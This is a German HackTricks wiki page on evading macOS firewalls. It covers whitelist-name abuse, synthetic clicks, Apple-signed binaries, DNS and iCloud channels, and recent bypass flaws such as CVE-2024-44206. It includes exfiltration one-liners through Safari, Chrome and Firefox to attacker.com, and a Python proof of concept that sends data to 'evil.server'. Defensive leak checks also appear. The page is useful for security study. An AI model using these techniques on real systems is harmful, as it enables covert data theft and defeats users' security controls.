# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps als funktionierend festgestellt.

### Missbrauch von Whitelist-Namen

- Zum Beispiel das Malware mit Namen bekannter macOS-Prozesse wie **`launchd`** aufrufen.

### Synthetischer Klick

- Wenn die Firewall um Erlaubnis vom Benutzer bittet, lasse die Malware **auf Erlauben klicken**.

### **Verwendung von von Apple signierten Binärdateien**

- Wie **`curl`**, aber auch andere wie **`whois`**.

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. Und iCloud könnte als C2 verwendet werden.

### Generischer Bypass

Einige Ideen, um zu versuchen, Firewalls zu umgehen.

### Erlaubten Verkehr überprüfen

Das Wissen um den erlaubten Verkehr wird Ihnen helfen, potenziell auf die Whitelist gesetzte Domains oder welche Anwendungen Zugriff darauf haben, zu identifizieren.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Missbrauch von DNS

DNS-Auflösungen erfolgen über die signierte Anwendung **`mdnsreponder`**, die wahrscheinlich berechtigt ist, DNS-Server zu kontaktieren.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Über Prozessinjektionen

Wenn Sie **Code in einen Prozess injizieren** können, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, könnten Sie die Firewall-Schutzmaßnahmen umgehen:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Aktuelle macOS Firewall-Umgehungsschwachstellen (2023-2025)

### Umgehung des Webinhaltsfilters (Bildschirmzeit) – **CVE-2024-44206**
Im Juli 2024 hat Apple einen kritischen Fehler in Safari/WebKit behoben, der den systemweiten „Webinhaltsfilter“ beeinträchtigte, der von den Bildschirmzeit-Elterngesetzen verwendet wird. 
Eine speziell gestaltete URI (zum Beispiel mit doppelt URL-kodiertem “://”) wird von der Bildschirmzeit-ACL nicht erkannt, aber von WebKit akzeptiert, sodass die Anfrage ungefiltert gesendet wird. Jeder Prozess, der eine URL öffnen kann (einschließlich sandboxed oder unsigniertem Code), kann daher auf Domains zugreifen, die vom Benutzer oder einem MDM-Profil ausdrücklich blockiert sind.

Praktischer Test (nicht gepatchtes System):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) Regelreihenfolge-Fehler in der frühen macOS 14 “Sonoma”
Während des macOS 14 Beta-Zyklus führte Apple eine Regression im Userspace-Wraparound **`pfctl`** ein. Regeln, die mit dem `quick` Schlüsselwort hinzugefügt wurden (verwendet von vielen VPN-Kill-Switches), wurden stillschweigend ignoriert, was zu Datenlecks führte, selbst wenn eine VPN/Firewall-GUI *blockiert* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (Build 23A344) behoben.

Schneller Leak-Check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Missbrauch von von Apple signierten Hilfsdiensten (legacy – vor macOS 11.2)
Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`** ~50 Apple-Binärdateien wie **`nsurlsessiond`** und den App Store, alle Socket-Filter-Firewalls, die mit dem Network Extension-Framework implementiert wurden (LuLu, Little Snitch usw.), zu umgehen. Malware konnte einfach einen ausgeschlossenen Prozess starten – oder Code in ihn injizieren – und ihren eigenen Datenverkehr über den bereits erlaubten Socket tunneln. Apple hat die Ausschlussliste in macOS 11.2 vollständig entfernt, aber die Technik ist auf Systemen, die nicht aktualisiert werden können, weiterhin relevant.

Beispiel für einen Proof-of-Concept (vor 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Tooling-Tipps für modernes macOS

1. Überprüfen Sie die aktuellen PF-Regeln, die GUI-Firewalls generieren:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Zählen Sie Binärdateien auf, die bereits das *outgoing-network* Entitlement besitzen (nützlich für Piggy-Backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registrieren Sie programmgesteuert Ihren eigenen Network Extension Content Filter in Objective-C/Swift.
Ein minimales rootless PoC, das Pakete an einen lokalen Socket weiterleitet, ist im Quellcode von Patrick Wardle’s **LuLu** verfügbar.

## Referenzen

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
